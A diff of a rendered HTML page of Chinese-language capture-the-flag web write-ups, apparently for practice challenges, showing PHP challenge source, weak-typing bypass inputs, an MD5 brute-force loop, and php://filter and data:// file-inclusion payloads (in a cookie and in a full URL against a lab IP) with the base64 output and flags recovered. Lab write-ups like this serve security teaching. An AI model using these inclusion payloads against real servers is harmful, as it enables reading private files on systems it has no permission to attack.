-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">3</span><span>// $flag = cyberpeace{b4b95f7908800224e26dffaad1b75598}</span></span></code></pre></div><h2 id=116-easyphp>1.16 easyphp<a class=anchor href=#116-easyphp>#</a></h2><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-PHP data-lang=PHP><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 1</span><span><span style=color:#ff7b72;font-weight:700>&lt;?</span>php
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 2</span><span>highlight_file(<span style=color:#79c0ff;font-weight:700>__FILE__</span>);<span style=color:#8b949e;font-style:italic>//__FILE__指向当前执行脚本的绝对路径(包含文件名如C:\www\index.php)，而highlight_file()函数接收到路径，然后去读取文件的文本内容，并使用php语法高亮转换成html代码
-</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 3</span><span><span style=color:#79c0ff>$key1</span> <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>0</span>;
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 4</span><span><span style=color:#79c0ff>$key2</span> <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>0</span>;
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 5</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 6</span><span><span style=color:#79c0ff>$a</span> <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#79c0ff>$_GET</span>[<span style=color:#a5d6ff>&#39;a&#39;</span>];
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 7</span><span><span style=color:#79c0ff>$b</span> <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#79c0ff>$_GET</span>[<span style=color:#a5d6ff>&#39;b&#39;</span>];
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 8</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 9</span><span><span style=color:#ff7b72>if</span>(isset(<span style=color:#79c0ff>$a</span>) <span style=color:#ff7b72;font-weight:700>&amp;&amp;</span> intval(<span style=color:#79c0ff>$a</span>) <span style=color:#ff7b72;font-weight:700>&gt;</span> <span style=color:#a5d6ff>6000000</span> <span style=color:#ff7b72;font-weight:700>&amp;&amp;</span> strlen(<span style=color:#79c0ff>$a</span>) <span style=color:#ff7b72;font-weight:700>&lt;=</span> <span style=color:#a5d6ff>3</span>){<span style=color:#8b949e;font-style:italic>//如果变量$a存在，且其整数值大于600万，且字符串长度不超过3个字符
-</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">10</span><span>    <span style=color:#ff7b72>if</span>(isset(<span style=color:#79c0ff>$b</span>) <span style=color:#ff7b72;font-weight:700>&amp;&amp;</span> <span style=color:#a5d6ff>&#39;8b184b&#39;</span> <span style=color:#ff7b72;font-weight:700>===</span> substr(md5(<span style=color:#79c0ff>$b</span>),<span style=color:#ff7b72;font-weight:700>-</span><span style=color:#a5d6ff>6</span>,<span style=color:#a5d6ff>6</span>)){<span style=color:#8b949e;font-style:italic>//如果一个字符串$b，它的MD5值最后6位字符恰好等于8b184b，其中isset($b)检查变量$b是否存在，substr(...,-6,6)表示从字符串倒第六位开始取6个字符
-</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">11</span><span>        <span style=color:#79c0ff>$key1</span> <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>1</span>;
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">12</span><span>        }<span style=color:#ff7b72>else</span>{
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">13</span><span>            <span style=color:#ff7b72>die</span>(<span style=color:#a5d6ff>&#34;Emmm...再想想&#34;</span>);
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">14</span><span>        }
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">15</span><span>    }<span style=color:#ff7b72>else</span>{
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">16</span><span>    <span style=color:#ff7b72>die</span>(<span style=color:#a5d6ff>&#34;Emmm...&#34;</span>);
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">17</span><span>}
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">18</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">19</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">20</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">21</span><span><span style=color:#79c0ff>$c</span><span style=color:#ff7b72;font-weight:700>=</span>(<span style=color:#ff7b72>array</span>)json_decode(<span style=color:#ff7b72;font-weight:700>@</span><span style=color:#79c0ff>$_GET</span>[<span style=color:#a5d6ff>&#39;c&#39;</span>]);<span style=color:#8b949e;font-style:italic>//将用户从URL传入的字符串转换成PHP的关联数组，json_decode(...)将JSON格式的字符串转换成PHP对象，(array)将对象强制转为数组
-</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">22</span><span><span style=color:#ff7b72>if</span>(is_array(<span style=color:#79c0ff>$c</span>) <span style=color:#ff7b72;font-weight:700>&amp;&amp;</span> <span style=color:#ff7b72;font-weight:700>!</span>is_numeric(<span style=color:#ff7b72;font-weight:700>@</span><span style=color:#79c0ff>$c</span>[<span style=color:#a5d6ff>&#34;m&#34;</span>]) <span style=color:#ff7b72;font-weight:700>&amp;&amp;</span> <span style=color:#79c0ff>$c</span>[<span style=color:#a5d6ff>&#34;m&#34;</span>] <span style=color:#ff7b72;font-weight:700>&gt;</span> <span style=color:#a5d6ff>2022</span>){<span style=color:#8b949e;font-style:italic>//变量$c是一个数组，其中键名&#34;m&#34;的值不能是数字，且键名&#34;m&#34;在数值比较上要大于2022
-</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">23</span><span>    <span style=color:#ff7b72>if</span>(is_array(<span style=color:#ff7b72;font-weight:700>@</span><span style=color:#79c0ff>$c</span>[<span style=color:#a5d6ff>&#34;n&#34;</span>]) <span style=color:#ff7b72;font-weight:700>&amp;&amp;</span> count(<span style=color:#79c0ff>$c</span>[<span style=color:#a5d6ff>&#34;n&#34;</span>]) <span style=color:#ff7b72;font-weight:700>==</span> <span style=color:#a5d6ff>2</span> <span style=color:#ff7b72;font-weight:700>&amp;&amp;</span> is_array(<span style=color:#79c0ff>$c</span>[<span style=color:#a5d6ff>&#34;n&#34;</span>][<span style=color:#a5d6ff>0</span>])){<span style=color:#8b949e;font-style:italic>//变量$c的键名&#34;n&#34;是一个数组，且键名&#34;n&#34;数量为2，且键名&#34;n&#34;的第一个元素为1
-</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">24</span><span>        <span style=color:#79c0ff>$d</span> <span style=color:#ff7b72;font-weight:700>=</span> array_search(<span style=color:#a5d6ff>&#34;DGGJ&#34;</span>, <span style=color:#79c0ff>$c</span>[<span style=color:#a5d6ff>&#34;n&#34;</span>]);<span style=color:#8b949e;font-style:italic>//调用array_search()，在数组$c[&#34;n&#34;]中寻找字符串&#34;DGGJ&#34;，并把找到的键名赋值为变量$d
-</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">25</span><span>        <span style=color:#79c0ff>$d</span> <span style=color:#ff7b72;font-weight:700>===</span> <span style=color:#ff7b72>false</span><span style=color:#ff7b72;font-weight:700>?</span><span style=color:#ff7b72>die</span>(<span style=color:#a5d6ff>&#34;no...&#34;</span>)<span style=color:#ff7b72;font-weight:700>:</span><span style=color:#ff7b72>NULL</span>;
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">26</span><span>        <span style=color:#ff7b72>foreach</span>(<span style=color:#79c0ff>$c</span>[<span style=color:#a5d6ff>&#34;n&#34;</span>] <span style=color:#ff7b72>as</span> <span style=color:#79c0ff>$key</span><span style=color:#ff7b72;font-weight:700>=&gt;</span><span style=color:#79c0ff>$val</span>){
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">27</span><span>            <span style=color:#79c0ff>$val</span><span style=color:#ff7b72;font-weight:700>===</span><span style=color:#a5d6ff>&#34;DGGJ&#34;</span><span style=color:#ff7b72;font-weight:700>?</span><span style=color:#ff7b72>die</span>(<span style=color:#a5d6ff>&#34;no......&#34;</span>)<span style=color:#ff7b72;font-weight:700>:</span><span style=color:#ff7b72>NULL</span>;
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">28</span><span>        }
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">29</span><span>        <span style=color:#79c0ff>$key2</span> <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>1</span>;
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">30</span><span>    }<span style=color:#ff7b72>else</span>{
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">31</span><span>        <span style=color:#ff7b72>die</span>(<span style=color:#a5d6ff>&#34;no hack&#34;</span>);
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">32</span><span>    }
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">33</span><span>}<span style=color:#ff7b72>else</span>{
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">34</span><span>    <span style=color:#ff7b72>die</span>(<span style=color:#a5d6ff>&#34;no&#34;</span>);
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">35</span><span>}
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">36</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">37</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">38</span><span><span style=color:#ff7b72>if</span>(<span style=color:#79c0ff>$key1</span> <span style=color:#ff7b72;font-weight:700>&amp;&amp;</span> <span style=color:#79c0ff>$key2</span>){
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">39</span><span>    <span style=color:#ff7b72>include</span> <span style=color:#a5d6ff>&#34;Hgfks.php&#34;</span>;
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">40</span><span>    <span style=color:#ff7b72>echo</span> <span style=color:#a5d6ff>&#34;You&#39;re right&#34;</span><span style=color:#ff7b72;font-weight:700>.</span><span style=color:#a5d6ff>&#34;</span><span style=color:#79c0ff>\n</span><span style=color:#a5d6ff>&#34;</span>;
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">41</span><span>    <span style=color:#ff7b72>echo</span> <span style=color:#79c0ff>$flag</span>;
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">42</span><span>}
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">43</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">44</span><span><span style=color:#8b949e;font-weight:700;font-style:italic>?&gt;</span><span style=color:#f85149> Emmm...
-</span></span></span></code></pre></div><ul><li>a，大于600万且字符串长度小于3，7e6</li><li>b，MD5后六位是8b184b，53724</li><li>c，包含m（非数字，但大于2022）和n（一个数组，数量为2，第一个元素为1），{&ldquo;m&rdquo;:&ldquo;2025a&rdquo;, &ldquo;n&rdquo;:[[], 0]}<ul><li>c是数字</li><li>m不能是纯数字</li><li>m的数值要大于2022</li><li>n必须是有两个内容的数组</li><li>n数组里的第一个内容也是数组</li><li>在n中能通过弱类型比较找到<code>DGGJ</code></li><li>在执行<code>$d = array_search("DGGJ", $c["n"]);</code>时，在PHP8.0之前的版本中，用一个数字和一个字符串进行<code>==</code>比较时候，php会尝试把字符串转为数字，如果字符串不是以数字开头的，则会强制转换为数字<code>0</code>，<code>0=="DGGJ"</code>就会变成<code>0==0</code></li></ul></li></ul><p>其中b的结果只能用爆破脚本，因为MD5是不可逆的，只能从0开始一个个数字试</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-PHP data-lang=PHP><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">1</span><span><span style=color:#ff7b72;font-weight:700>&lt;?</span>php
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">2</span><span><span style=color:#ff7b72>for</span> ( <span style=color:#79c0ff>$i</span> <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>1</span>; <span style=color:#79c0ff>$i</span> <span style=color:#ff7b72;font-weight:700>&lt;</span> <span style=color:#a5d6ff>999999999</span>; <span style=color:#79c0ff>$i</span><span style=color:#ff7b72;font-weight:700>++</span> ){
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">3</span><span>    <span style=color:#ff7b72>if</span> (<span style=color:#a5d6ff>&#39;8b184b&#39;</span> <span style=color:#ff7b72;font-weight:700>===</span> substr(md5(<span style=color:#79c0ff>$i</span>),<span style=color:#ff7b72;font-weight:700>-</span><span style=color:#a5d6ff>6</span>,<span style=color:#a5d6ff>6</span>) ){
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">4</span><span>        <span style=color:#ff7b72>echo</span>(<span style=color:#79c0ff>$i</span>);
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">5</span><span>    }
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">6</span><span>}
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">7</span><span><span style=color:#8b949e;font-weight:700;font-style:italic>?&gt;</span><span style=color:#f85149>
+<code>language=php://filter/read=convert.base64-encode/resource=/var/www/html/flag</code></p>
+<ul>
+<li><code>php://filter</code>是元封装器，让开发者在打开文件流时能够应用特定的过滤器</li>
+<li><code>read=</code>告诉php，要对读取的数据流进行操作</li>
+<li><code>convert.base64-encode</code>要求php将读取的文件内容进行Base64编码（防止php引擎解析目标文件的内容，吐过直接包含<code>flag.php</code>，php引擎会识别其中的<code>&lt;?php...?&gt;</code>，并运行，结果是看不到flag的，只有编码后，对于php引擎来说，这段base64字符串只是一串普通的文本，于是不会运行，）</li>
+<li><code>resource=/var/www/html/flag</code>指定读取的目标文件路径</li>
+<li>注入到<code>$lan</code>变量后，服务器实际执行的命令等同于<code>include(&quot;php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php&quot;);</code></li>
+<li><code>$lan</code>是如何打印出来的：<code>include</code>函数的作用是读取文件内容，且直接输出到HTML页面中</li>
+</ul>
+<p>F12，在hackbar中，给cookie注入<code>language=php://filter/read=convert.base64-encode/resource=/var/www/html/flag</code></p>
+<p>执行后获得base64编码
+<code>PD9waHANCiRmbGFnPSJjeWJlcnBlYWNle2QyNzY4MDQ4MWRjNzUyNGE1NTM5YWJhM2FlNDEzZjgxfSI7DQo/Pg==</code></p>
+<p>base64解码后获得</p>
+<pre tabindex="0"><code>&lt;?php
+$flag=&#34;cyberpeace{d27680481dc7524a5539aba3ae413f81}&#34;;
+?&gt;</code></pre><h2 id="115-fileclude文件包含伪协议">1.15 fileclude(文件包含伪协议)<a class="anchor" href="#115-fileclude%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e4%bc%aa%e5%8d%8f%e8%ae%ae">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-PHP" data-lang="PHP"><span style="display:flex;"><span>WRONG WAY<span style="color:#ff6ac1">!</span> <span style="color:#ff6ac1">&lt;?</span>php
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">include</span>(<span style="color:#5af78e">&#34;flag.php&#34;</span>);
+</span></span><span style="display:flex;"><span>highlight_file(<span style="color:#ff9f43">__FILE__</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">if</span>(isset(<span style="color:#ff5c57">$_GET</span>[<span style="color:#5af78e">&#34;file1&#34;</span>]) <span style="color:#ff6ac1">&amp;&amp;</span> isset(<span style="color:#ff5c57">$_GET</span>[<span style="color:#5af78e">&#34;file2&#34;</span>]))
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">$file1</span> <span style="color:#ff6ac1">=</span> <span style="color:#ff5c57">$_GET</span>[<span style="color:#5af78e">&#34;file1&#34;</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">$file2</span> <span style="color:#ff6ac1">=</span> <span style="color:#ff5c57">$_GET</span>[<span style="color:#5af78e">&#34;file2&#34;</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">if</span>(<span style="color:#ff6ac1">!</span><span style="color:#ff6ac1">empty</span>(<span style="color:#ff5c57">$file1</span>) <span style="color:#ff6ac1">&amp;&amp;</span> <span style="color:#ff6ac1">!</span><span style="color:#ff6ac1">empty</span>(<span style="color:#ff5c57">$file2</span>))
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">if</span>(file_get_contents(<span style="color:#ff5c57">$file2</span>) <span style="color:#ff6ac1">===</span> <span style="color:#5af78e">&#34;hello ctf&#34;</span>)
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">include</span>(<span style="color:#ff5c57">$file1</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">else</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">die</span>(<span style="color:#5af78e">&#34;NONONO&#34;</span>);
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><ul>
+<li><code>include()</code>作用：当前<em>脚本执行处</em>包含并运行一个指定文件的代码</li>
+<li>如果<code>$file2</code>内容为<code>hello ctf</code>，那么</li>
+<li>利用<code>$file1</code>文件包含漏洞执行代码or读取flag</li>
+</ul>
+<p>payload构造：
+<code>http://61.147.171.105:53798/index.php?file1=php://filter/read=convert.base64-encode/resource=flag.php&amp;file2=data://text/plain,hello ctf</code></p>
+<ul>
+<li><code>php://filter</code>告诉php，对文件流进行过滤操作</li>
+<li><code>read=convert.base64-encode</code>是过滤器指令</li>
+<li><code>data://</code>data协议头，表示后面跟着的是数据本身</li>
+<li><code>text/plain</code>告诉服务器，这些数据是纯文本格式</li>
+<li><code>,hello ctf</code>逗号后面是具体内容</li>
+</ul>
+<p><code>PD9waHAKZWNobyAiV1JPTkcgV0FZISI7Ci8vICRmbGFnID0gY3liZXJwZWFjZXtiNGI5NWY3OTA4ODAwMjI0ZTI2ZGZmYWFkMWI3NTU5OH0=</code></p>
+<pre tabindex="0"><code>&lt;?php
+echo &#34;WRONG WAY!&#34;;
+// $flag = cyberpeace{b4b95f7908800224e26dffaad1b75598}</code></pre><h2 id="116-easyphp">1.16 easyphp<a class="anchor" href="#116-easyphp">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-PHP" data-lang="PHP"><span style="display:flex;"><span><span style="color:#ff6ac1">&lt;?</span>php
+</span></span><span style="display:flex;"><span>highlight_file(<span style="color:#ff9f43">__FILE__</span>);<span style="color:#78787e">//__FILE__指向当前执行脚本的绝对路径(包含文件名如C:\www\index.php)，而highlight_file()函数接收到路径，然后去读取文件的文本内容，并使用php语法高亮转换成html代码
+</span></span></span><span style="display:flex;"><span><span style="color:#ff5c57">$key1</span> <span style="color:#ff6ac1">=</span> <span style="color:#ff9f43">0</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$key2</span> <span style="color:#ff6ac1">=</span> <span style="color:#ff9f43">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$a</span> <span style="color:#ff6ac1">=</span> <span style="color:#ff5c57">$_GET</span>[<span style="color:#5af78e">&#39;a&#39;</span>];
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$b</span> <span style="color:#ff6ac1">=</span> <span style="color:#ff5c57">$_GET</span>[<span style="color:#5af78e">&#39;b&#39;</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">if</span>(isset(<span style="color:#ff5c57">$a</span>) <span style="color:#ff6ac1">&amp;&amp;</span> intval(<span style="color:#ff5c57">$a</span>) <span style="color:#ff6ac1">&gt;</span> <span style="color:#ff9f43">6000000</span> <span style="color:#ff6ac1">&amp;&amp;</span> strlen(<span style="color:#ff5c57">$a</span>) <span style="color:#ff6ac1">&lt;=</span> <span style="color:#ff9f43">3</span>){<span style="color:#78787e">//如果变量$a存在，且其整数值大于600万，且字符串长度不超过3个字符
+</span></span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">if</span>(isset(<span style="color:#ff5c57">$b</span>) <span style="color:#ff6ac1">&amp;&amp;</span> <span style="color:#5af78e">&#39;8b184b&#39;</span> <span style="color:#ff6ac1">===</span> substr(md5(<span style="color:#ff5c57">$b</span>),<span style="color:#ff6ac1">-</span><span style="color:#ff9f43">6</span>,<span style="color:#ff9f43">6</span>)){<span style="color:#78787e">//如果一个字符串$b，它的MD5值最后6位字符恰好等于8b184b，其中isset($b)检查变量$b是否存在，substr(...,-6,6)表示从字符串倒第六位开始取6个字符
+</span></span></span><span style="display:flex;"><span>        <span style="color:#ff5c57">$key1</span> <span style="color:#ff6ac1">=</span> <span style="color:#ff9f43">1</span>;
+</span></span><span style="display:flex;"><span>        }<span style="color:#ff6ac1">else</span>{
+</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">die</span>(<span style="color:#5af78e">&#34;Emmm...再想想&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }<span style="color:#ff6ac1">else</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">die</span>(<span style="color:#5af78e">&#34;Emmm...&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$c</span><span style="color:#ff6ac1">=</span>(<span style="color:#ff6ac1">array</span>)json_decode(<span style="color:#ff6ac1">@</span><span style="color:#ff5c57">$_GET</span>[<span style="color:#5af78e">&#39;c&#39;</span>]);<span style="color:#78787e">//将用户从URL传入的字符串转换成PHP的关联数组，json_decode(...)将JSON格式的字符串转换成PHP对象，(array)将对象强制转为数组
+</span></span></span><span style="display:flex;"><span><span style="color:#ff6ac1">if</span>(is_array(<span style="color:#ff5c57">$c</span>) <span style="color:#ff6ac1">&amp;&amp;</span> <span style="color:#ff6ac1">!</span>is_numeric(<span style="color:#ff6ac1">@</span><span style="color:#ff5c57">$c</span>[<span style="color:#5af78e">&#34;m&#34;</span>]) <span style="color:#ff6ac1">&amp;&amp;</span> <span style="color:#ff5c57">$c</span>[<span style="color:#5af78e">&#34;m&#34;</span>] <span style="color:#ff6ac1">&gt;</span> <span style="color:#ff9f43">2022</span>){<span style="color:#78787e">//变量$c是一个数组，其中键名&#34;m&#34;的值不能是数字，且键名&#34;m&#34;在数值比较上要大于2022
+</span></span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">if</span>(is_array(<span style="color:#ff6ac1">@</span><span style="color:#ff5c57">$c</span>[<span style="color:#5af78e">&#34;n&#34;</span>]) <span style="color:#ff6ac1">&amp;&amp;</span> count(<span style="color:#ff5c57">$c</span>[<span style="color:#5af78e">&#34;n&#34;</span>]) <span style="color:#ff6ac1">==</span> <span style="color:#ff9f43">2</span> <span style="color:#ff6ac1">&amp;&amp;</span> is_array(<span style="color:#ff5c57">$c</span>[<span style="color:#5af78e">&#34;n&#34;</span>][<span style="color:#ff9f43">0</span>])){<span style="color:#78787e">//变量$c的键名&#34;n&#34;是一个数组，且键名&#34;n&#34;数量为2，且键名&#34;n&#34;的第一个元素为1
+</span></span></span><span style="display:flex;"><span>        <span style="color:#ff5c57">$d</span> <span style="color:#ff6ac1">=</span> array_search(<span style="color:#5af78e">&#34;DGGJ&#34;</span>, <span style="color:#ff5c57">$c</span>[<span style="color:#5af78e">&#34;n&#34;</span>]);<span style="color:#78787e">//调用array_search()，在数组$c[&#34;n&#34;]中寻找字符串&#34;DGGJ&#34;，并把找到的键名赋值为变量$d
+</span></span></span><span style="display:flex;"><span>        <span style="color:#ff5c57">$d</span> <span style="color:#ff6ac1">===</span> <span style="color:#ff6ac1">false</span><span style="color:#ff6ac1">?</span><span style="color:#ff6ac1">die</span>(<span style="color:#5af78e">&#34;no...&#34;</span>)<span style="color:#ff6ac1">:</span><span style="color:#ff6ac1">NULL</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">foreach</span>(<span style="color:#ff5c57">$c</span>[<span style="color:#5af78e">&#34;n&#34;</span>] <span style="color:#ff6ac1">as</span> <span style="color:#ff5c57">$key</span><span style="color:#ff6ac1">=&gt;</span><span style="color:#ff5c57">$val</span>){
+</span></span><span style="display:flex;"><span>            <span style="color:#ff5c57">$val</span><span style="color:#ff6ac1">===</span><span style="color:#5af78e">&#34;DGGJ&#34;</span><span style="color:#ff6ac1">?</span><span style="color:#ff6ac1">die</span>(<span style="color:#5af78e">&#34;no......&#34;</span>)<span style="color:#ff6ac1">:</span><span style="color:#ff6ac1">NULL</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#ff5c57">$key2</span> <span style="color:#ff6ac1">=</span> <span style="color:#ff9f43">1</span>;
+</span></span><span style="display:flex;"><span>    }<span style="color:#ff6ac1">else</span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">die</span>(<span style="color:#5af78e">&#34;no hack&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}<span style="color:#ff6ac1">else</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">die</span>(<span style="color:#5af78e">&#34;no&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
